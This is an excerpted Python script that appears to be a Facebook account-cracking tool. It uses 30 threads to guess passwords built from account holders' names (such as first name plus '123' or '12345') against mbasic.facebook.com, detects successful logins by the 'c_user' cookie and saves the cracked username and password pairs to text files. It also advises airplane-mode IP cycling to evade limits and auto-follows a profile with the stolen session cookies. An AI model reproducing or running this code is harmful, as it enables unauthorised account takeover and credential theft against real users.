...
from concurrent.futures import ThreadPoolExecutor as sarfrazIKB
...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Infinix X680B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
...
logo =                                          """   
   ...
   \033[0;32;47m ######      ######     ########  
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[0;32;47m Author \x1b[1;97m : \033[0;32;47m          IKB
\033[1;31m\033[0;32;47m Facebook\x1b[1;97m:  \033[0;32;47m      BAD ME BTAONGA
\033[1;31m\033[0;32;47m Version\x1b[1;97m : \033[0;32;47m             1.0
\033[0;32;47m------------------------\033[0;32;47m------------------------ """                                              

def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mIKB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mIKB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back IKB Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[IKB] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [IKB-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('IKB_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [IKB-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('IKB_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100001457641705', cookies={'cookie': coki}).text, 'html.parser')
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\033[1;31m\rUse flight (airplane) mode before use\033[0;32;47m")
            print(47*"-")
            print('\033[0;32;47m Total Auto file IDs : %s ' % len(self.id))
            print('\033[0;32;47m Cracking Started...')
            print(47*"-")
            with sarfrazIKB(max_workers=30) as IKBworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                            pwx = [firstl+' '+lastl, xz[0]+"12345", xz[0]+"123"]
                        IKBworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[0;32;47m\rEnter Last Name Digits\033[0;32;47m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            ...
            print("\033[1;31m\rUse flight (airplane) mode before use\033[0;32;47m")
            print(47*"-")
            print('\033[0;32;47m Total IDs : %s ' % len(self.id))
            print('\033[0;32;47m Cracking Started...')
            print(47*"-")
            with sarfrazIKB(max_workers=30) as IKBworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
